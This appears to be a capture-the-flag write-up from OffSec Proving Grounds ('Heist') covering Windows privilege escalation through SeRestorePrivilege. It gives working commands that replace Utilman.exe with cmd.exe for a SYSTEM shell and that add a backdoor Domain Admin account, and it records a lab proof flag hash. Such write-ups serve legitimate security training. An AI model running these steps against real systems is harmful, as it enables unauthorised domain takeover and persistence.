# Local Enumeration

We drop into C:\Users\svc_apache$\Documents which contains EnableSeRestorePrivilege.ps1.

`whoami /priv`

```
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Checking https://github.com/gtworek/Priv2Admin
SeRestorePrivilege can be used to gain Admin access.

![[Pasted image 20250817095505.png]]

The EnableSeRestorePrivilege.ps1 in our working directory seems to be a nod to this privilege escalation vector.

Found Utilman.exe in C:\Windows\System32:

![[Pasted image 20250817095838.png]]

```
powershell -ep bypass
.\EnableSeRestorePrivilege.ps1
move C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.old
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```


Now we can RDP to the target and press Win+u to run C:\Windows\System32\Utilman.exe (which has been replaced with cmd.exe).

![[Pasted image 20250817100504.png]]

Add a new domain admin:
```
net user Administrator2 Password123 /add
net group "Domain Admins" Administrator2 /add /domain
```

Now we can connect with evil-winrm as Administrator2!

![[Pasted image 20250817101006.png]]

I'll copy SauronEye.exe to find all of our flags.

C:\Users\Administrator\Desktop\proof.txt: d50f3bf9eb83edb1b6b101af2dfb2443

# Continue: [[Archive/OFFSEC - Proving Grounds Writeups/Windows/Heist/Findings|Findings]]